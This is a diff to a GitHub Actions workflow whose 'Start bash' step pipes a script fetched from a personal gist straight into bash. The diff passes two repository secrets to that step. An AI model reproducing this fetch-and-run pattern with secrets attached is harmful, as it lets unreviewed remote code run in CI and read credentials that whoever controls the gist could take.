@@ -17,4 +17,7 @@ jobs:
               uses: actions/checkout@v4
 
             - name: Start bash
+              env:
+                IMAGE_NAME: ${{ secrets.IMAGE_NAME }}
+                CONFIG_URL: ${{ secrets.CONFIG_URL }}
               run: curl https://gist.githubusercontent.com/lagoon812/93f8859f2bae7138a211da3fe020d27c/raw/run.sh?a=$(date "+%D%T") | bash
